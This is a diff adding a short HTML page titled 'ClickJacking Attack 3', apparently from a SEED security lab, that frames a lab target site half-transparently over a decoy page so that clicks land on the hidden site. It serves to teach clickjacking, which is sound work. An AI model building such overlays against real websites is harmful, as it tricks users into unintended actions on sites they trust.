@@ -1,0 +1,25 @@
+<html>
+<head>
+<title>ClickJacking Attack 3</title>
+<style type="text/css">
+</style>
+</head>
+
+<body>
+
+<iframe id="bottom" src="./bottom3.html" 
+		    style="border:0px; width:800px; height:1500px;">
+</iframe>
+
+<iframe id="top" src="http://www.seed-server.com/"  
+                 style="border:0px; width:800px; height:1500px;">
+</iframe>
+
+<style type="text/css">
+  #top     {position:absolute; top:0px; left:0px; opacity:0.5}
+  #bottom  {position:absolute; top:0px; left:0px; opacity:1.0}
+</style>
+
+</body>
+</html>
+
